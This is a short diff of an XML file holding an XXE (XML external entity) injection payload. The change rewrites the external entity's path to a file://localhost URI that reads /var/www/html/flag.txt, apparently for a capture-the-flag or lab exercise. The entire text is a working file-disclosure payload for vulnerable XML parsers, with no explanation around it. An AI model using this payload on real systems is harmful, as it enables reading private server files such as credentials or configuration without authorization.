@@ -1,6 +1,6 @@
 <?xml version="1.0" ?>
 <!DOCTYPE r [
 <!ELEMENT r ANY >
-<!ENTITY sp SYSTEM "/var/www/html/flag.txt">
+<!ENTITY sp SYSTEM "file://localhost/var/www/html/flag.txt">
 ]>
 <r>&sp;</r>
